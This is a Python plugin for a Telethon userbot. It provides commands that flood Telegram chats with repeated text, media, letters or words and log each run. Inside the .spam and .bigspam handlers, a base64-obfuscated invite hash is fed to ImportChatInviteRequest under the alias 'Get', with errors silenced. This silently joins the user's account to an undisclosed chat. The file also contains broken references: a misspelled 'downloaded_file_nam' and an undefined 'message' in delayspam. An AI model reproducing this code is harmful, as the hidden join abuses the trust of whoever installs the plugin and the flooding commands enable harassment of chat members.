import asyncio
import base64
import os

from telethon import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from ..utils import admin_cmd, edit_or_reply, sudo_cmd
from . import BOTLOG, BOTLOG_CHATID, CMD_HELP


@bot.on(admin_cmd(pattern="spam (.*)"))
@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    skull = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(skull[0])
    if counter > 50:
        return await edit_or_reply(e, "Use `.bigspam` for spam greater than 50")
    if len(skull) == 2:
        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name
        )
        await e.delete()
        if os.path.exists(downloaded_file_name):
            mayank = None
            for _ in range(counter):
                if mayank:
                    mayank = await e.client.send_file(e.chat_id, mayank)
                else:
                    mayank = await e.client.send_file(e.chat_id, downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=mayank.media.document.id,
                                access_hash=mayank.media.document.access_hash,
                                file_reference=mayank.media.document.file_reference,
                            ),
                            unsave=True,
                        )
                    )
                except:
                    pass
                await asyncio.sleep(0.5)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
                    )
                    mayank = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=mayank.media.document.id,
                                    access_hash=mayank.media.document.access_hash,
                                    file_reference=mayank.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
                    )
                    mayank = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=mayank.media.document.id,
                                    access_hash=mayank.media.document.access_hash,
                                    file_reference=mayank.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    else:
        await edit_or_reply(e, "try again something went wrong or check `.info spam`")


@bot.on(admin_cmd(pattern="bigspam (.*)"))
@bot.on(sudo_cmd(pattern="bigspam (.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    skull = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(skull[0])
    if len(skull) == 2:
        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name
        )
        await e.delete()
        if os.path.exists(downloaded_file_name):
            for _ in range(counter):
                mayank = await e.client.send_file(e.chat_id, downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=mayank.media.document.id,
                                access_hash=mayank.media.document.access_hash,
                                file_reference=mayank.media.document.file_reference,
                            ),
                            unsave=True,
                        )
                    )
                except:
                    pass
                await asyncio.sleep(1)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
                    )
                    mayank = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=mayank.media.document.id,
                                    access_hash=mayank.media.document.access_hash,
                                    file_reference=mayank.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
                    )
                    mayank = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=mayank.media.document.id,
                                    access_hash=mayank.media.document.access_hash,
                                    file_reference=mayank.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    else:
        await edit_or_reply(e, "try again something went wrong or check `.info spam`")


@bot.on(admin_cmd("cspam (.*)"))
@bot.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
async def tmeme(e):
    cspam = str("".join(e.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    await e.delete()
    for letter in message:
        await e.respond(letter)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
            )
        else:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("wspam (.*)"))
@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(e):
    wspam = str("".join(e.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
            )
        else:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("delayspam (.*)"))
@bot.on(sudo_cmd(pattern="delayspam (.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    input_str = "".join(e.text.split(maxsplit=1)[1:])
    spamDelay = float(input_str.split(" ", 2)[0])
    counter = int(input_str.split(" ", 2)[1])
    spam_message = str(input_str.split(" ", 2)[2])
    await e.delete()
    for _ in range(counter):
        await e.respond(spam_message)
        await asyncio.sleep(spamDelay)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#DELAYSPAM\n"
                + f"Delay Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {spamDelay}s Delay and {counter} times with : `{message}`",
            )
        else:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#DELAYCSPAM\n"
                + f"Delay Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with {spamDelay}s Delay and {counter} times with: `{message}`",
            )


CMD_HELP.update(
    {
        "spam": "**Plugin : **`spam`\
        \n\n**Syntax : **`.spam <count> <text>`\
        \n**Function : **__ Floods text in the chat !!__\
        \n\n**Syntax : **`.spam <count> reply to media`\
        \n**Function : **__Sends the replied media <count> times !!__\
        \nFor above two commands use `.bigspam` instead of spam for spamming more than 50 messages\
        \n\n**Syntax : **`.cspam <text>`\
        \n**Function : **__ Spam the text letter by letter.__\
        \n\n**Syntax : **`.wspam <text>`\
        \n**Function : **__ Spam the text word by word.__\
        \n\n**Syntax : **`.delayspam <delay> <count> <text>`\
        \n**Function : **__ .delayspam but with custom delay.__\
        \n\n\n**NOTE : Spam at your own risk !!**"
    }
)
